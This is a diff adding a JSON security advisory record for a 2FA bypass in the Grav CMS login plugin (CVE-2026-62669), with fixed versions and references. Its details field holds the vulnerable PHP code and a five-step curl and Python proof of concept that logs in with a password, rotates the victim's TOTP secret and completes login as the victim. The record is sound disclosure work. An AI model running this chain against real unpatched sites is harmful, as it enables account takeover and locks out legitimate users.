@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-7mgc-c7pq-3rr3",
+  "modified": "2026-09-02T22:01:25Z",
+  "published": "2026-09-02T22:01:25Z",
+  "aliases": [
+    "CVE-2026-62669"
+  ],
+  "summary": "Grav: 2FA Bypass via 'login.regenerate2FASecret' - Secret Rotation During Pending Challenge",
+  "details": "### Summary\nWhen 2FA is enabled on an account, submitting correct credentials authenticates the user but leaves them unauthorized pending TOTP verification. During this pending-challenge window, the `login.regenerate2FASecret` task which requires only `$user->exists()`, not `$user->authorized`  can be called without a CSRF nonce. It overwrites the victim's `twofa_secret` on disk with an attacker-chosen value, returns the new secret in the JSON response, and the attacker computes a valid TOTP code to complete the 2FA flow. The second factor is **reduced to password-only**. The exploit was confirmed live after enabling 2FA to a user.\n\n### Details\nFour code locations in login plugin v3.8.10 enable the chain:\n\n**1. Session user set even with 2FA pending**  \n`user/plugins/login/login.php` - `userLogin()` assigns `$session->user = $user` before TOTP verification completes. This makes `$this->grav['user']` point to the victim in the pending-challenge window.\n\n**2. `taskRegenerate2FASecret` - no authorization check**  \n`user/plugins/login/classes/Controller.php`\n\n```php\npublic function taskRegenerate2FASecret()\n{\n    $user = $this->grav['user'];\n    if ($user->exists()) {                  // ← only checks exists(), NOT authorized()\n        $secret = $twoFa->createSecret();\n        $user->twofa_secret = $secret;      // overwrites victim's secret on disk\n        $user->save();\n        $json_response = [\n            'status' => 'success',\n            'image' => $image,\n            'secret' => trim(preg_replace('|(\\w{4})|', '\\\\1 ', $secret)) // ← returned to attacker\n        ];\n    }\n}\n```\n\n**3. No CSRF nonce required**  \n`user/plugins/login/login.php` - the task dispatch switch only validates `twofa_cancel` for nonce. `regenerate2FASecret` is not guarded, making it exploitable via a single unauthenticated GET request on the victim's session.\n\n### PoC\n**Confirmed live** on this instance after enabling `plugins.login.twofa_enabled: true` and configuring TOTP on the `user` account.\n\n```bash\n# Step 1: Password-only login (lands in 2FA-pending; keep session cookie)\nLOGIN_PAGE=$(curl -s -c /tmp/2fa.jar \"http://127.0.0.1/grav/login\")\nNONCE=$(echo \"$LOGIN_PAGE\" | grep -oP 'name=\"login-form-nonce\" value=\"\\K[^\"]+')\ncurl -s -b /tmp/2fa.jar -c /tmp/2fa.jar -X POST \\\n  \"http://127.0.0.1/grav/login\" \\\n  -d \"username=user&password=Summer2024!&task=login.login&login-form-nonce=${NONCE}\"\n\n# Step 2: Regenerate the 2FA secret (NO nonce required)\ncurl -s -b /tmp/2fa.jar \\\n  \"http://127.0.0.1/grav/login/task:login.regenerate2FASecret\"\n# {\"status\":\"success\",\"secret\":\"FS5P SYNP 24YH X3AM 3DP3 PADG RIPV B4K5\",...}\n\n# Step 3: Compute TOTP from the attacker-chosen secret\npython3 -c \"import pyotp; print(pyotp.TOTP('FS5PSYNP24YHX3AM3DP3PADGRIPVB4K5').now())\"\n# 152656\n\n# Step 4: Complete 2FA with attacker's TOTP code\ncurl -s -L -b /tmp/2fa.jar -X POST \"http://127.0.0.1/grav/login\" \\\n  -d \"task=login.twofa&2fa_code=152656\"\n\n# Step 5: Verify - fully authenticated as victim\ncurl -s -b /tmp/2fa.jar \"http://127.0.0.1/grav/\" | grep -o 'Grav User\\|Logout'\n# Grav User Logout\n```\n\n### Impact\nComplete 2FA bypass reducing the second factor to password-only. An attacker who knows the victim's password (via credential reuse, phishing, or cracking) can bypass TOTP-based 2FA by forcing a secret rotation during the pending-challenge window, computing a valid TOTP from the attacker-chosen secret, and completing the 2FA flow. The victim's legitimate TOTP secret is permanently overwritten on disk via `$user->save()`, locking them out of their own account.\n\nThe endpoint requires no CSRF token, making it exploitable via a single GET request. A logged-in victim visiting `http://target/login/task:login.regenerate2FASecret` on any attacker-controlled page would have their 2FA secret silently rotated.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.4"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-7mgc-c7pq-3rr3"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-62669"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav-plugin-login/commit/5d1b722298cb947d8f434025d121b99152a2c630"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav-plugin-login/releases/tag/3.8.11"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/releases/tag/2.0.4"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-287"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-09-02T22:01:25Z",
+    "nvd_published_at": "2026-08-19T16:18:19Z"
+  }
+}
